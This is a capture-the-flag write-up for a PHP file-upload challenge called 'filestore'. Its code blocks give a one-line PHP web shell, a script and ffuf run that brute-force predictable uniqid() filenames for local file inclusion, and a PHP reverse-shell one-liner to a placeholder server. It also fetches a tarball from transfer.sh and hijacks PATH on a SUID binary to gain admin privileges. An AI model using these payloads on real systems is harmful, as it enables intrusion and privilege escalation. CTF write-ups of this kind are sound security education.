# filestore
For this challenge we are given the following source code
```php
<?php
    if($_SERVER['REQUEST_METHOD'] == "POST"){
        if ($_FILES["f"]["size"] > 1000) {
            echo "file too large";
            return;
        }
    
        $i = uniqid();

        if (empty($_FILES["f"])){
            return;
        }

        if (move_uploaded_file($_FILES["f"]["tmp_name"], "./uploads/" . $i . "_" . hash('sha256', $_FILES["f"]["name"]) . "_" . $_FILES["f"]["name"])){
            echo "upload success";
        } else {
            echo "upload error";
        }
    } else {
        if (isset($_GET["f"])) {
            include "./uploads/" . $_GET["f"];
        }

        highlight_file("index.php");

        // this doesn't work, so I'm commenting it out 😛
        // system("/list_uploads");
    }
?>
```

From reading this we see we can get file inclusion if we know the filename of the file we uploaded.
The problem is that `uniqid()` is put into the filename but uniqid is not a secure source of randomness, it is based on the time in microseconds.
There is more methods to sync your server clock with the target to reduce the number of requests required:
[![Telling The Time by Chris Anley](https://img.youtube.com/vi/WiGif0D3fIc/default.jpg)](https://www.youtube.com/watch?v=WiGif0D3fIc)
But since I'm lazy I took the quicker path and just take the uniqid before I upload the file and after and then bruteforce that range:

```php
<?php
$cfile = curl_file_create('shell.php');
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://filestore.web.actf.co/");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_POST, true); // enable posting
curl_setopt($curl, CURLOPT_POSTFIELDS, array('f' => $cfile)); // post images

$a = uniqid();
$resp = curl_exec($curl);
$b = uniqid();
curl_close($curl);

echo PHP_EOL.$a.PHP_EOL.$b.PHP_EOL;
echo hexdec($b)-hexdec($a);
echo PHP_EOL.$resp;
```
This script uploads our `shell.php` (`<?php echo system($_GET['x']);`) and gets a range of uniqids it could be in and prints the size of that range.
To get a closer range you can rerun the script a few times and use whichever range is smallest (the second time benefits from DNS caching etc).

I used python to make the wordlist
```python
start = int('64445b33c39fb',16)
end = int('64445b34bfe93',16)
for i in range(end,start,-1):
	print(hex(i)[2:])
```
We generate the list backwards as we expect the uniqid to be closer the end time than the start.

And then [ffuf](https://github.com/ffuf/ffuf) to bruteforce it
```sh
ffuf -u 'https://filestore.web.actf.co/?f=FUZZ_92fc4a95a29d181d748d812e6dde0d27e5ecb28a67ee9475d11e472b01911f64_shell.php' -w wl.txt -fs 5499
```
-fs 5499 filters out results with that page size, the page has an error message for file not found so page size will be different when we get the right id.
Eventually we get the id for the file after ~200k requests and can include it:
```
https://filestore.web.actf.co/?x=ls -lah&f=64445b34a19e1_92fc4a95a29d181d748d812e6dde0d27e5ecb28a67ee9475d11e472b01911f64_shell.php
```
So we set up a backconnect
```
https://filestore.web.actf.co/?x=php%20-r%20%27%24sock%3Dfsockopen(%22MYSERVERIP%22%2CMYSERVERPORT)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27&f=64445b34a19e1_92fc4a95a29d181d748d812e6dde0d27e5ecb28a67ee9475d11e472b01911f64_shell.php

php -r '$sock=fsockopen("MYSERVERIP",MYSERVERPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```
Next we need to escalate privleges to read the flag.txt.
There's two binaries: make_abyss_entry and list_uploads
Running make_abyss_entry creates a folder in /abyss/ so we can write files without other players from the CTF reading or interfering with them
`list_uploads` is where our SUID bug is.
```c
void main(void)
{
	__gid_t __rgid;

	setbuf((FILE *)_IO_2_1_stdout_,(char *)0x0);
	setbuf((FILE *)_IO_2_1_stdin_,(char *)0x0);
	__rgid = getegid();
	setresgid(__rgid,__rgid,__rgid);
	system('ls /var/www/html/uploads');
	return;
}
```
The mistake with this code is that the full path for `ls` is not specified in the `system()` call. This is a security issue for programs with SUID because it means that it will rely on the $PATH variable to determine where the `ls` binary is and will run it with elevated privleges.
On this server chmod has been removed so to get around this we can create our `ls` file on our machine, set the execute bit and tar it:
```sh
$ cat ls
#!/bin/sh
sh
$ chmod +x ls
$ tar -cf lol.tar ls
$ curl -T lol.tar https://transfer.sh
https://transfer.sh/aMggoj/lol.tar
$ nc -lvp 4000
```

Then on the target system:
```sh
$ ./make_abyss_entry
chown fail: Operation not permitted
cea16835c06f2f4e529f553904bde9eb7b114a1465f77e1c1121b5c948f1f209
$ cd /abyss/cea16835c06f2f4e529f553904bde9eb7b114a1465f77e1c1121b5c948f1f209
$ curl https://transfer.sh/aMggoj/lol.tar -o lol.tar
$ tar -xf lol.tar
$ cd /
$ PATH=/abyss/cea16835c06f2f4e529f553904bde9eb7b114a1465f77e1c1121b5c948f1f209/:$PATH ./list_uploads
id
uid=998(ctf) gid=999(admin) groups=999(admin)
cat flag.txt
actf{w4tch_y0ur_p4th_724248b559281824}
```
